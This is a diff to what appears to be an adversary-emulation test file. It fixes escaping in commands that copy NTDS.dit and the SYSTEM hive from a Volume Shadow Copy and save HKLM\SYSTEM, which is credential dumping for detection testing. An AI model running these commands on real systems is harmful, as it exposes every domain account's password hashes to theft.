@@ -56,9 +56,9 @@ vssadmin.exe create shadow /for=C:
 
 ## Atomic Test #2 - Copy NTDS.dit from Volume Shadow Copy
 
-copy &#92;&#92;?&#92;GLOBALROOT&#92;Device&#92;HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:&#92;Windows&#92;Temp\ntds.dit
-copy &#92;&#92;?&#92;GLOBALROOT&#92;Device&#92;HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:&#92;Windows&#92;Temp\VSC_SYSTEM_HIVE
-reg save HKLM\SYSTEM C:&#92;Windows&#92;Temp\SYSTEM_HIVE
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\Windows\Temp\ntds.dit
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Windows\Temp\VSC_SYSTEM_HIVE
+reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM_HIVE
 
 T1003.004.md
 T1003.005.md
